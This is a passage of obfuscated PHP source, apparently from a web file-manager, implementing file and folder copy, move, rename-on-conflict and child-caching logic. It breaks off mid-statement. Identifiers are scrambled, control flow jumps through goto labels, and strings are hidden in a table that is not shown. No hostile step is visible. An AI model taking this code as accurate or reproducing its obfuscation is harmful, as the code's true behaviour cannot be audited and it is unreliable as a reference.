$d²Íä¹³µ«[83]; goto BŞÑ°ÃÆ; BŞÑ°ÃÆ: $E™‡®„ÊÂ = $cÙ±ˆÊ÷Ô£ ? $cÙ±ˆÊ÷Ô£ : $Fèˆ¤¤„‚…[$d²Íä¹³µ«[28]]; $eá¨œëåªÚ = $this->fileNameExistCache($d‡õˆêË¾Æ, $E™‡®„ÊÂ); if ($b¶æó¸éÔ£) { $this->_childrenAllMake($Bö…ÛŞ»ğ—); if ($AœŠ¼ÂÈçÂ && $eá¨œëåªÚ) { $this->_childrenAllMake($eá¨œëåªÚ); } } goto c…Ûˆ÷”É÷; c…Ûˆ÷”É÷: if (!$eá¨œëåªÚ) { return $this->_copyCreate($Bö…ÛŞ»ğ—, $d‡õˆêË¾Æ, $E™‡®„ÊÂ, $dØ™”Òø‰); } $A¶õîÕÈïÌ = $eá¨œëåªÚ; if ($AœŠ¼ÂÈçÂ) { if ($a †ÃÚè£ == REPEAT_RENAME_FOLDER) { $E™‡®„ÊÂ = $this->fileNameAutoCache($d‡õˆêË¾Æ, $E™‡®„ÊÂ, $a †ÃÚè£, $AœŠ¼ÂÈçÂ); $A¶õîÕÈïÌ = $this->_copyCreate($Bö…ÛŞ»ğ—, $d‡õˆêË¾Æ, $E™‡®„ÊÂ, $dØ™”Òø‰); } else { $aï½ÙÜù = $this->_childrenList($Bö…ÛŞ»ğ—); foreach ($aï½ÙÜù as $d¬íÏØ¡§ğ) { $this->_copy($d¬íÏØ¡§ğ[$d²Íä¹³µ«[394]], $eá¨œëåªÚ, $a †ÃÚè£, $dØ™”Òø‰, !1); } } } else { if ($a †ÃÚè£ == REPEAT_RENAME || $a †ÃÚè£ == REPEAT_RENAME_FOLDER) { $E™‡®„ÊÂ = $this->fileNameAutoCache($d‡õˆêË¾Æ, $E™‡®„ÊÂ, $a †ÃÚè£, $AœŠ¼ÂÈçÂ); $A¶õîÕÈïÌ = $this->_copyCreate($Bö…ÛŞ»ğ—, $d‡õˆêË¾Æ, $E™‡®„ÊÂ, $dØ™”Òø‰); } else { if ($a †ÃÚè£ == REPEAT_REPLACE) { $e´ÃãŠÂ = $this->sourceInfoCache($eá¨œëåªÚ); $AÌ—î¿æ† = $this->fileHistory($e´ÃãŠÂ, $Fèˆ¤¤„‚…[$d²Íä¹³µ«[444]], $Fèˆ¤¤„‚…[$d²Íä¹³µ«[77]]); if ($AÌ—î¿æ†) { $dØ™”Òø‰[$d²Íä¹³µ«[527]][] = $Fèˆ¤¤„‚…[$d²Íä¹³µ«[444]]; } } else { if ($a †ÃÚè£ == REPEAT_SKIP) { } } } Hook::trigger($d²Íä¹³µ«[532], array($d²Íä¹³µ«[533], $Fèˆ¤¤„‚…, 0)); } goto b”Œï¨—Ñº; E´… Ñ¨…: } private function _copyCreate($FÁ‰ßòõ‡, $AÊ„ìĞÀªá, $E…ùÄîÉ¯Ô, &$d·‰«ìï—‘) { goto f÷‚é°É£; fÈåİŸ£–›: foreach ($F•¾ñÏ´Ó as $cñ‚Òëö–) { $AîÓ®ƒ¯ê™ = $cñ‚Òëö–[$Dğ©¼Ì§‹£[394]]; $CÒôÍÇà‘ = $this->_childrenMatch($d«âÀ˜¯Öœ, $cñ‚Òëö–, $a‡‚‹¦Á×Ÿ); $DËÚÃ«¡Ã[] = array($Dğ©¼Ì§‹£[394], $AîÓ®ƒ¯ê™, $Dğ©¼Ì§‹£[487], $CÒôÍÇà‘[$Dğ©¼Ì§‹£[487]]); $f¸ÛÑç“[] = array($Dğ©¼Ì§‹£[394], $AîÓ®ƒ¯ê™, $Dğ©¼Ì§‹£[485], $CÒôÍÇà‘[$Dğ©¼Ì§‹£[485]]); $this->_copyApplyMeta($cñ‚Òëö–, $d·‰«ìï—‘); if ($cñ‚Òëö–[$Dğ©¼Ì§‹£[395]] != $Dğ©¼Ì§‹£[83]) { $d·‰«ìï—‘[$Dğ©¼Ì§‹£[527]][] = $cñ‚Òëö–[$Dğ©¼Ì§‹£[444]]; } } $this->chunkEventSet($Dğ©¼Ì§‹£[539], array($Dğ©¼Ì§‹£[540], $fÑ¯«†ƒ«, $c¸Ğ‡—‚à°)); $this->saveAll($DËÚÃ«¡Ã); goto BËÄ„î‚‚°; D­±×˜šëê: $fÑ¯«†ƒ« = $this->_makeItemData($B‚àÄ£¡ô, $B´ïğİìĞ†, $E…ùÄîÉ¯Ô); Hook::trigger($Dğ©¼Ì§‹£[534], $fÑ¯«†ƒ«); Hook::trigger($Dğ©¼Ì§‹£[535], array($Dğ©¼Ì§‹£[536], $fÑ¯«†ƒ«, 0)); goto Ağ„…Ö©†; f÷‚é°É£: $Dğ©¼Ì§‹£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B‚àÄ£¡ô = $this->sourceInfoCache($FÁ‰ßòõ‡); $B´ïğİìĞ† = $this->sourceInfoCache($AÊ„ìĞÀªá); goto D­±×˜šëê; Ağ„…Ö©†: $aƒ•ÑñÉÜ = $this->add($fÑ¯«†ƒ«); $DÈŒ›ö¤Ï¢ = array($Dğ©¼Ì§‹£[394] => $aƒ•ÑñÉÜ, $Dğ©¼Ì§‹£[28] => $E…ùÄîÉ¯Ô); $this->_copyApplyMeta($DÈŒ›ö¤Ï¢, $d·‰«ìï—‘); goto bè„‚ËŞíÄ; bè„‚ËŞíÄ: if ($B‚àÄ£¡ô[$Dğ©¼Ì§‹£[395]] != $Dğ©¼Ì§‹£[83]) { $d·‰«ìï—‘[$Dğ©¼Ì§‹£[527]][] = $B‚àÄ£¡ô[$Dğ©¼Ì§‹£[444]]; return $aƒ•ÑñÉÜ; } $c´Óî¥†£‡ = array(); $F³ƒ°ÕâÊÕ = array(); goto B„×’à›´¨; A¾¹”¡Ê­÷: $d«âÀ˜¯Öœ[$FÁ‰ßòõ‡] = $aƒ•ÑñÉÜ; $DËÚÃ«¡Ã = array(); $f¸ÛÑç“ = array(); goto fÈåİŸ£–›; F—öôˆóÇ: $this->addAll($F³ƒ°ÕâÊÕ, array(), !1); $F•¾ñÏ´Ó = $this->where(array($Dğ©¼Ì§‹£[487] => $aƒ•ÑñÉÜ))->select(); $d«âÀ˜¯Öœ = $this->_childrenMakeRelation($c´Óî¥†£‡, $F•¾ñÏ´Ó); goto A¾¹”¡Ê­÷; BËÄ„î‚‚°: $this->chunkEventSet($Dğ©¼Ì§‹£[541], array($Dğ©¼Ì§‹£[542], $fÑ¯«†ƒ«, $c¸Ğ‡—‚à°)); $this->saveAll($f¸ÛÑç“); return $aƒ•ÑñÉÜ; goto f§ó•˜¢†º; FéíŸÌö¶Ñ: $a‡‚‹¦Á×Ÿ = $this->sourceInfo($aƒ•ÑñÉÜ); foreach ($c´Óî¥†£‡ as $cñ‚Òëö–) { $B êœ„°¨ = $this->_makeItemData($cñ‚Òëö–, $a‡‚‹¦Á×Ÿ, $cñ‚Òëö–[$Dğ©¼Ì§‹£[28]]); $B êœ„°¨[$Dğ©¼Ì§‹£[485]] = $cñ‚Òëö–[$Dğ©¼Ì§‹£[485]]; $F³ƒ°ÕâÊÕ[] = $B êœ„°¨; } $this->chunkEventSet($Dğ©¼Ì§‹£[537], array($Dğ©¼Ì§‹£[538], $fÑ¯«†ƒ«, $c¸Ğ‡—‚à°)); goto F—öôˆóÇ; B„×’à›´¨: $this->_childrenListAll($FÁ‰ßòõ‡, $c´Óî¥†£‡); $c¸Ğ‡—‚à° = count($c´Óî¥†£‡); if ($c¸Ğ‡—‚à° == 0) { return $aƒ•ÑñÉÜ; } goto FéíŸÌö¶Ñ; f§ó•˜¢†º: } private function _childrenMakeRelation($eñ‰½šàé×, $cåÈå²Œ¼õ) { $bÀª©ßñ» =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dî¶¨•‘ã = array(); $d„å¾‰ˆª = array(); foreach ($eñ‰½šàé× as $d²ÈÆåè¹‘) { $dèÃä„ˆŠ = $d²ÈÆåè¹‘[$bÀª©ßñ»[28]] . $bÀª©ßñ»[8] . $d²ÈÆåè¹‘[$bÀª©ßñ»[485]]; $Dî¶¨•‘ã[$dèÃä„ˆŠ] = $d²ÈÆåè¹‘[$bÀª©ßñ»[394]]; } foreach ($cåÈå²Œ¼õ as $d²ÈÆåè¹‘) { $dèÃä„ˆŠ = $d²ÈÆåè¹‘[$bÀª©ßñ»[28]] . $bÀª©ßñ»[8] . $d²ÈÆåè¹‘[$bÀª©ßñ»[485]]; $A÷ïçØ½®Ã = $Dî¶¨•‘ã[$dèÃä„ˆŠ]; $d„å¾‰ˆª[$A÷ïçØ½®Ã] = $d²ÈÆåè¹‘[$bÀª©ßñ»[394]]; } return $d„å¾‰ˆª; } private function _childrenMatch($Bœ‹•…¿‹”, $Bôî·ƒã£—, $bó™àšêªÕ) { goto D‘°Ã ”²Û; D‘°Ã ”²Û: $BÎÖï‚¢Á¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B©½•èÈ£À = $bó™àšêªÕ[$BÎÖï‚¢Á¿[485]]; $d¡á´ÃÖ®¦ = $this->parentLevelArray($Bôî·ƒã£—[$BÎÖï‚¢Á¿[485]]); goto dÃ²ÚÑî²ó; dÃ²ÚÑî²ó: foreach ($d¡á´ÃÖ®¦ as $c¸éÀ …éõ) { if (isset($Bœ‹•…¿‹”[$c¸éÀ …éõ])) { $B©½•èÈ£À .= $Bœ‹•…¿‹”[$c¸éÀ …éõ] . $BÎÖï‚¢Á¿[543]; } } $B©½•èÈ£À = rtrim($B©½•èÈ£À, $BÎÖï‚¢Á¿[47]) . $BÎÖï‚¢Á¿[47]; $E˜Ü–÷½ = $this->parentLevelArray($B©½•èÈ£À); goto cÛˆáôÊ“õ; cÛˆáôÊ“õ: $E›È‘×óàö = $E˜Ü–÷½[count($E˜Ü–÷½) - 1]; return array($BÎÖï‚¢Á¿[487] => $E›È‘×óàö, $BÎÖï‚¢Á¿[485] => $B©½•èÈ£À); goto C¬¥Ü®ïŒ; C¬¥Ü®ïŒ: } private function _makeItemData($c‹§Û¤ÈÎÊ, $aµ©‡½°, $d§æœ‹¡†¡) { $Bíññ‹¾Ã¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eê¶ß¼Í‰ˆ = array($Bíññ‹¾Ã¸[544] => $c‹§Û¤ÈÎÊ[$Bíññ‹¾Ã¸[395]], $Bíññ‹¾Ã¸[411] => $d§æœ‹¡†¡, $Bíññ‹¾Ã¸[545] => $c‹§Û¤ÈÎÊ[$Bíññ‹¾Ã¸[397]], $Bíññ‹¾Ã¸[445] => $c‹§Û¤ÈÎÊ[$Bíññ‹¾Ã¸[444]], $Bíññ‹¾Ã¸[546] => $c‹§Û¤ÈÎÊ[$Bíññ‹¾Ã¸[77]], $Bíññ‹¾Ã¸[547] => $aµ©‡½°[$Bíññ‹¾Ã¸[396]], $Bíññ‹¾Ã¸[548] => $aµ©‡½°[$Bíññ‹¾Ã¸[482]], $Bíññ‹¾Ã¸[549] => USER_ID, $Bíññ‹¾Ã¸[550] => USER_ID, $Bíññ‹¾Ã¸[393] => $aµ©‡½°[$Bíññ‹¾Ã¸[394]], $Bíññ‹¾Ã¸[551] => $aµ©‡½°[$Bíññ‹¾Ã¸[485]] . $aµ©‡½°[$Bíññ‹¾Ã¸[394]] . $Bíññ‹¾Ã¸[47], $Bíññ‹¾Ã¸[421] => 0, $Bíññ‹¾Ã¸[552] => $Bíññ‹¾Ã¸[33]); return $Eê¶ß¼Í‰ˆ; } private function _copyApplyMeta($BĞİŠÎÕÊ°, &$eÅ¹‡Ö’åƒ) { $e¢æ¶ô’Îï =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÕè‰È·Š» = $BĞİŠÎÕÊ°[$e¢æ¶ô’Îï[394]]; $EŒ¢°¾÷ñ = $BĞİŠÎÕÊ°[$e¢æ¶ô’Îï[28]]; if (!isset($BĞİŠÎÕÊ°[$e¢æ¶ô’Îï[553]]) || !$BĞİŠÎÕÊ°[$e¢æ¶ô’Îï[553]] || $BĞİŠÎÕÊ°[$e¢æ¶ô’Îï[553]] == $e¢æ¶ô’Îï[494]) { $eÅ¹‡Ö’åƒ[$e¢æ¶ô’Îï[529]][] = array($e¢æ¶ô’Îï[394], $dÕè‰È·Š», $e¢æ¶ô’Îï[553], short_id($dÕè‰È·Š»)); } if (Input::check($EŒ¢°¾÷ñ, $e¢æ¶ô’Îï[554])) { $eÅ¹‡Ö’åƒ[$e¢æ¶ô’Îï[528]][] = array($e¢æ¶ô’Îï[394] => $dÕè‰È·Š», $e¢æ¶ô’Îï[89] => $e¢æ¶ô’Îï[441], $e¢æ¶ô’Îï[375] => str_replace($e¢æ¶ô’Îï[50], $e¢æ¶ô’Îï[33], Pinyin::encode($EŒ¢°¾÷ñ))); $eÅ¹‡Ö’åƒ[$e¢æ¶ô’Îï[528]][] = array($e¢æ¶ô’Îï[394] => $dÕè‰È·Š», $e¢æ¶ô’Îï[89] => $e¢æ¶ô’Îï[440], $e¢æ¶ô’Îï[375] => Pinyin::encode($EŒ¢°¾÷ñ, $e¢æ¶ô’Îï[555])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($c¬¤º„à÷ö) { goto E‚ÜîğßÄ; BÀĞ’­†ƒ: $cŠ’òø‹Š = array($a¥†¶ôÅÃÙ[485] => array($a¥†¶ôÅÃÙ[509], $eÎ”‘‡¢è[$a¥†¶ôÅÃÙ[485]] . $c¬¤º„à÷ö . $a¥†¶ôÅÃÙ[510]), $a¥†¶ôÅÃÙ[422] => $this->targetIsDelete); $CµËöÊİšŒ = $this->field($EÁ…ª³È)->where($cŠ’òø‹Š)->select(); if (!$CµËöÊİšŒ) { return; } goto Dîâî‚¤Ì; E‚ÜîğßÄ: $a¥†¶ôÅÃÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÎ”‘‡¢è = $this->sourceInfo($c¬¤º„à÷ö); $EÁ…ª³È = $a¥†¶ôÅÃÙ[423]; goto BÀĞ’­†ƒ; Dîâî‚¤Ì: $CµËöÊİšŒ = array_to_keyvalue($CµËöÊİšŒ, $a¥†¶ôÅÃÙ[394]); foreach ($CµËöÊİšŒ as $Cø‚¶š†…î) { $BåËæ™ôí© = $Cø‚¶š†…î[$a¥†¶ôÅÃÙ[487]]; $c¬¤º„à÷ö = $Cø‚¶š†…î[$a¥†¶ôÅÃÙ[394]]; if (!isset($this->_childrenListCache[$c¬¤º„à÷ö]) && $Cø‚¶š†…î[$a¥†¶ôÅÃÙ[395]] == $a¥†¶ôÅÃÙ[83]) { $this->_childrenListCache[$c¬¤º„à÷ö] = array(); } if (!isset($this->_childrenListCache[$BåËæ™ôí©])) { $this->_childrenListCache[$BåËæ™ôí©] = array(); } $this->_childrenListCache[$BåËæ™ôí©][$c¬¤º„à÷ö] = $Cø‚¶š†…î; $this->_childrenItemCache[$c¬¤º„à÷ö] = $Cø‚¶š†…î; } goto B¦µ–œö…; B¦µ–œö…: } private function _childrenListAll($ešäŒá¦·, &$d¶‰‘³¼) { $BÂöõì© =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->_childrenListCache[$ešäŒá¦·])) { return; } $f„åó·¡Ê¹ = $this->_childrenListCache[$ešäŒá¦·]; foreach ($f„åó·¡Ê¹ as $DÅ‡ã÷àç => $FÒš­¬¹±Á) { $d¶‰‘³¼[$DÅ‡ã÷àç] = $FÒš­¬¹±Á; if ($FÒš­¬¹±Á[$BÂöõì©[395]] == $BÂöõì©[83]) { $this->_childrenListAll($DÅ‡ã÷àç, $d¶‰‘³¼); } } } private function sourceInfoCache($fäŸĞ¬âù´) { if (isset($this->_childrenItemCache[$fäŸĞ¬âù´])) { return $this->_childrenItemCache[$fäŸĞ¬âù´]; } return $this->sourceInfo($fäŸĞ¬âù´); } private function _childrenList($fÙòˆ¥ …¿) { if (isset($this->_childrenListCache[$fÙòˆ¥ …¿])) { return $this->_childrenListCache[$fÙòˆ¥ …¿]; } return $this->_childrenListSelect($fÙòˆ¥ …¿); } private function _childrenListSelect($dµ¼ëÏ·Ë³) { goto F«¼¼©ñİØ; F«¼¼©ñİØ: $D‡ª¥¡¿†ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cã«Ş¼•Ôæ = array($D‡ª¥¡¿†ƒ[487] => $dµ¼ëÏ·Ë³, $D‡ª¥¡¿†ƒ[422] => $this->targetIsDelete); $BÄÉíˆß = $this->where($Cã«Ş¼•Ôæ)->select(); goto dáì¸ÉÒÓ„; f°èÀêï©ë: foreach ($a£¨ª­¨Øç as $dµ¼ëÏ·Ë³ => $C¦»áƒ†ÅÉ) { $this->_childrenItemCache[$dµ¼ëÏ·Ë³] = $C¦»áƒ†ÅÉ; } return $a£¨ª­¨Øç; goto eª‘ÒÅ¬Šƒ; dáì¸ÉÒÓ„: $BÄÉíˆß = $BÄÉíˆß ? $BÄÉíˆß : array(); $a£¨ª­¨Øç = array_to_keyvalue($BÄÉíˆß, $D‡ª¥¡¿†ƒ[394]); $this->_childrenListCache[$dµ¼ëÏ·Ë³] = $a£¨ª­¨Øç; goto f°èÀêï©ë; eª‘ÒÅ¬Šƒ: } private function fileNameExistCache($Bí´—å, $f¨†ìñĞŠ‡) { $BÃ™ø±ò› =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¨†ìñĞŠ‡ = strtolower($f¨†ìñĞŠ‡); $b½‹å³„˜• = $this->_childrenList($Bí´—å); foreach ($b½‹å³„˜• as $CòšÖ·Åë) { if ($f¨†ìñĞŠ‡ == strtolower($CòšÖ·Åë[$BÃ™ø±ò›[28]])) { return $CòšÖ·Åë[$BÃ™ø±ò›[394]]; } } return !1; } private function fileNameAutoCache($b…Ş‘ãªëƒ, $CŒÒ·­÷Á³, $aÛ™’•Ô¯È, $c„¦ïíä) { $f‚â­Ú°ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F÷‘î±¹Ù = $this->_childrenList($b…Ş‘ãªëƒ); $Dºğ™Ñ¹ë = array_to_keyvalue($F÷‘î±¹Ù, $f‚â­Ú°ƒ[33], $f‚â­Ú°ƒ[28]); return $this->fileNameAutoGet($Dºğ™Ñ¹ë, $CŒÒ·­÷Á³, $aÛ™’•Ô¯È, $c„¦ïíä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bƒ¸±˜ºƒÒ, $A½³ÀÉ¶Àà, $d„áÁÄ»•Ù = REPEAT_REPLACE, $CæË¡…ˆÕË = '') { goto EéİÌî³ŞÇ; A«¸‡Ë®: $this->lockMoveEnd($bƒ¸±˜ºƒÒ); $this->lockWriteEnd($A½³ÀÉ¶Àà, $FÖáÙìœÌÆ); $this->folderSizeReset($cÙÏÚÊå[$e¸ªÌß”«ó[487]]); goto cœá³©‡„; bÔŒøÖõ–ñ: if ($cÙÏÚÊå[$e¸ªÌß”«ó[395]] == $e¸ªÌß”«ó[83] && $d¹¹êßÊ) { $this->folderSizeResetChildren($fà¢ØÜí¨Ç); } Model($e¸ªÌß”«ó[171])->linkAdd($dŠğê–…[$e¸ªÌß”«ó[527]]); if ($d¹¹êßÊ && $dŠğê–…[$e¸ªÌß”«ó[558]]) { $this->removeNow($bƒ¸±˜ºƒÒ, !1); } goto A«¸‡Ë®; D Àİš½ÏÎ: if ($cÙÏÚÊå[$e¸ªÌß”«ó[487]] == $A½³ÀÉ¶Àà && $CæË¡…ˆÕË != $cÙÏÚÊå[$e¸ªÌß”«ó[28]]) { $BĞ‘ØÌœâ = $this->fileNameExist($A½³ÀÉ¶Àà, $CæË¡…ˆÕË); if ($BĞ‘ØÌœâ && $cÙÏÚÊå[$e¸ªÌß”«ó[395]] == $e¸ªÌß”«ó[494]) { goto DœÓø×¥›Ú; d¿ÑÜ±»‚‚: return $BĞ‘ØÌœâ; goto e¿›‹ÛÕŸ; DœÓø×¥›Ú: $C‡¸¶¼±©ó = $this->sourceInfo($BĞ‘ØÌœâ); $a…õê¤ÆÉ = $this->fileHistory($C‡¸¶¼±©ó, $cÙÏÚÊå[$e¸ªÌß”«ó[444]], $cÙÏÚÊå[$e¸ªÌß”«ó[77]]); if (!$a…õê¤ÆÉ) { Model($e¸ªÌß”«ó[447])->remove($cÙÏÚÊå[$e¸ªÌß”«ó[444]]); } goto Fî§½Á½; Fî§½Á½: $this->removeNow($bƒ¸±˜ºƒÒ, !1); $this->folderSizeReset($A½³ÀÉ¶Àà); Hook::trigger($e¸ªÌß”«ó[557], $c–öêÍÈ³); goto d¿ÑÜ±»‚‚; e¿›‹ÛÕŸ: } } $FÖáÙìœÌÆ = $CæË¡…ˆÕË ? $CæË¡…ˆÕË : $cÙÏÚÊå[$e¸ªÌß”«ó[28]]; $this->lockMoveStart($bƒ¸±˜ºƒÒ); goto FŞÃ“×‚åê; cœá³©‡„: $this->folderSizeReset($A½³ÀÉ¶Àà); $B¨‡ÌÒ½ØÔ = array($cÙÏÚÊå[$e¸ªÌß”«ó[487]], $A½³ÀÉ¶Àà); if ($cÙÏÚÊå[$e¸ªÌß”«ó[395]] == $e¸ªÌß”«ó[83]) { $B¨‡ÌÒ½ØÔ[] = $bƒ¸±˜ºƒÒ; } goto Aìƒè¶–¡—; AçøŠßà»Æ: return $fà¢ØÜí¨Ç; goto dÇÕƒ®Òö±; DÎˆÎÊè‘: $d¹¹êßÊ = $this->fileNameExistCache($A½³ÀÉ¶Àà, $cÙÏÚÊå[$e¸ªÌß”«ó[28]]); $fà¢ØÜí¨Ç = $this->_move($bƒ¸±˜ºƒÒ, $A½³ÀÉ¶Àà, $d„áÁÄ»•Ù, $dŠğê–…, $CæË¡…ˆÕË); $this->sourceCacheClear(); goto bÔŒøÖõ–ñ; Aìƒè¶–¡—: $this->updateModifyTime($B¨‡ÌÒ½ØÔ); Model($e¸ªÌß”«ó[531])->eventMove($bƒ¸±˜ºƒÒ, $cÙÏÚÊå[$e¸ªÌß”«ó[487]], $A½³ÀÉ¶Àà); Hook::trigger($e¸ªÌß”«ó[557], $c–öêÍÈ³); goto AçøŠßà»Æ; Cƒ‰¢· ½: if (!$cÙÏÚÊå || !$aù†¼š÷äî || $aù†¼š÷äî[$e¸ªÌß”«ó[395]] != $e¸ªÌß”«ó[83]) { return !1; } Hook::trigger($e¸ªÌß”«ó[556], $c–öêÍÈ³); $this->targetIsDelete = intval($cÙÏÚÊå[$e¸ªÌß”«ó[422]]); goto D Àİš½ÏÎ; FŞÃ“×‚åê: $this->lockWriteStart($A½³ÀÉ¶Àà, $FÖáÙìœÌÆ); $dŠğê–… = array($e¸ªÌß”«ó[527] => array(), $e¸ªÌß”«ó[558] => !1); $this->clearShare($bƒ¸±˜ºƒÒ, $A½³ÀÉ¶Àà); goto DÎˆÎÊè‘; EéİÌî³ŞÇ: $e¸ªÌß”«ó =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÙÏÚÊå = $this->sourceInfo($bƒ¸±˜ºƒÒ); $aù†¼š÷äî = $this->sourceInfo($A½³ÀÉ¶Àà); goto BŒêó’‘ö†; BŒêó’‘ö†: if ($cÙÏÚÊå[$e¸ªÌß”«ó[487]] == $aù†¼š÷äî[$e¸ªÌß”«ó[394]]) { if ($cÙÏÚÊå[$e¸ªÌß”«ó[422]] == $e¸ªÌß”«ó[83]) { Model($e¸ªÌß”«ó[420])->restore(array($bƒ¸±˜ºƒÒ)); } if (!$CæË¡…ˆÕË || $CæË¡…ˆÕË == $cÙÏÚÊå[$e¸ªÌß”«ó[28]]) { return $bƒ¸±˜ºƒÒ; } } $c–öêÍÈ³ = $this->pathInfoMore($bƒ¸±˜ºƒÒ); if ($this->isParentOf($bƒ¸±˜ºƒÒ, $A½³ÀÉ¶Àà)) { return !1; } goto Cƒ‰¢· ½; dÇÕƒ®Òö±: } private function _move($CÙÏâ¦İÓ©, $dƒ¡¥á›£Å, $AË÷ççœÄ, &$cîÃí§àÈ, $eÀîİ­¨íŠ = '') { goto aòŒ†„¾ëÏ; cÔÍë³Æ½å: $this->lockWriteStart($dƒ¡¥á›£Å, $cè’Å¥³ßø); if (!$bÈ›àÊÙåè) { return $this->_moveForce($CÙÏâ¦İÓ©, $dƒ¡¥á›£Å, $cè’Å¥³ßø); } $cÖ“‡­©‡ = $bÈ›àÊÙåè; goto béø¥ƒ«êÊ; aòŒ†„¾ëÏ: $d•½¢ã¨Î· =& $_SERVER[åÌÛ»ô¢‚ö™]; $E®å†ÑÓÛÆ = $this->sourceInfo($CÙÏâ¦İÓ©); $bÌéä’ = $E®å†ÑÓÛÆ[$d•½¢ã¨Î·[395]] == $d•½¢ã¨Î·[83]; goto bÏ„«×ÁŒÅ; FŒ²ˆòáªâ: return $cÖ“‡­©‡; goto Bìëæç±—­; bÏ„«×ÁŒÅ: $cè’Å¥³ßø = $eÀîİ­¨íŠ ? $eÀîİ­¨íŠ : $E®å†ÑÓÛÆ[$d•½¢ã¨Î·[28]]; $bÈ›àÊÙåè = $this->fileNameExistCache($dƒ¡¥á›£Å, $cè’Å¥³ßø); $this->lockMoveStart($CÙÏâ¦İÓ©); goto cÔÍë³Æ½å; béø¥ƒ«êÊ: $F£ó°à¬íñ = !1; if ($bÌéä’) { if ($AË÷ççœÄ == REPEAT_RENAME_FOLDER) { $cè’Å¥³ßø = $this->fileNameAuto($dƒ¡¥á›£Å, $cè’Å¥³ßø, $AË÷ççœÄ, $bÌéä’); $cÖ“‡­©‡ = $this->_moveForce($CÙÏâ¦İÓ©, $dƒ¡¥á›£Å, $cè’Å¥³ßø); } else { if ($AË÷ççœÄ == REPEAT_RENAME_FOLDER) { $AË÷ççœÄ = REPEAT_RENAME; } $bàÒ©˜˜Î = $this->_childrenListSelect($CÙÏâ¦İÓ©); foreach ($bàÒ©˜˜Î as $fã³ÎÃ‰) { $this->_move($fã³ÎÃ‰[$d•½¢ã¨Î·[394]], $bÈ›àÊÙåè, $AË÷ççœÄ, $cîÃí§àÈ); } $F£ó°à¬íñ = !0; } } else { if ($AË÷ççœÄ == REPEAT_SKIP) { $F£ó°à¬íñ = !0; } else { if ($AË÷ççœÄ == REPEAT_RENAME || $AË÷ççœÄ == REPEAT_RENAME_FOLDER) { $cè’Å¥³ßø = $this->fileNameAuto($dƒ¡¥á›£Å, $cè’Å¥³ßø, $AË÷ççœÄ, $bÌéä’); $cÖ“‡­©‡ = $this->_moveForce($CÙÏâ¦İÓ©, $dƒ¡¥á›£Å, $cè’Å¥³ßø); } else { if ($AË÷ççœÄ == REPEAT_REPLACE) { $B„±”Ó¤‘ = $this->sourceInfoCache($bÈ›àÊÙåè); $c¿£Ü»ÔŒá = $this->fileHistory($B„±”Ó¤‘, $E®å†ÑÓÛÆ[$d•½¢ã¨Î·[444]], $E®å†ÑÓÛÆ[$d•½¢ã¨Î·[77]]); if ($c¿£Ü»ÔŒá) { $cîÃí§àÈ[$d•½¢ã¨Î·[527]][] = $E®å†ÑÓÛÆ[$d•½¢ã¨Î·[444]]; } else { $F£ó°à¬íñ = !0; } } } } } if ($F£ó°à¬íñ && !$cîÃí§àÈ[$d•½¢ã¨Î·[558]]) { $cîÃí§àÈ[$d•½¢ã¨Î·[558]] = !0; } goto FŒ²ˆòáªâ; Bìëæç±—­: } private function _moveForce($dÆãÖ‹Ôé™, $aÄ„Ü›ôÄ, $fÇâ¥À®ÌË) { goto f°Û›˜‚¤; båŠ£õò¹´: $bæ¬ÁŠŞ¯î = $d—‡Ûï¤Îõ[$EòÏø’Å‡[395]] == $EòÏø’Å‡[83]; $fŸ¤›”µ = array($EòÏø’Å‡[393] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[394]], $EòÏø’Å‡[551] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[485]] . $F¾ÆÉÌÍŠ[$EòÏø’Å‡[394]] . $EòÏø’Å‡[47], $EòÏø’Å‡[547] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[396]], $EòÏø’Å‡[548] => $F¾ÆÉÌÍŠ[$EòÏø’Å‡[482]], $EòÏø’Å‡[550] => USER_ID, $EòÏø’Å‡[411] => $fÇâ¥À®ÌË); $c˜¦¥‹ô…ï = $d—‡Ûï¤Îõ[$EòÏø’Å‡[396]] == SourceModel::TYPE_GROUP && $F¾ÆÉÌÍŠ[$EòÏø’Å‡[396]] == SourceModel::TYPE_GROUP && $d—‡Ûï¤Îõ[$EòÏø’Å‡[482]] == $F¾ÆÉÌÍŠ[$EòÏø’Å‡[482]]; goto C™ï‚··Ö¥; C™ï‚··Ö¥: if (!$c˜¦¥‹ô…ï) { Model($EòÏø’Å‡[480])->authClear($dÆãÖ‹Ôé™); } $BÍ¯Ÿ˜Ş = $d—‡Ûï¤Îõ[$EòÏø’Å‡[422]] == $EòÏø’Å‡[83] && $F¾ÆÉÌÍŠ[$EòÏø’Å‡[422]] != $EòÏø’Å‡[83]; if ($BÍ¯Ÿ˜Ş) { $fŸ¤›”µ[$EòÏø’Å‡[421]] = 0; } goto BÏÍç•ìÓ; f°Û›˜‚¤: $EòÏø’Å‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d—‡Ûï¤Îõ = $this->sourceInfo($dÆãÖ‹Ôé™); $F¾ÆÉÌÍŠ = $this->sourceInfo($aÄ„Ü›ôÄ); goto båŠ£õò¹´; BÏÍç•ìÓ: if ($bæ¬ÁŠŞ¯î) { $Dã…ÑÈë›’ = array($EòÏø’Å‡[551] => array($EòÏø’Å‡[509], $d—‡Ûï¤Îõ[$EòÏø’Å‡[485]] . $d—‡Ûï¤Îõ[$EòÏø’Å‡[394]] . $EòÏø’Å‡[510])); $fËÇÙ•·³ = $d—‡Ûï¤Îõ[$EòÏø’Å‡[485]] . $d—‡Ûï¤Îõ[$EòÏø’Å‡[394]] . $EòÏø’Å‡[47]; $A“œŞã´– = 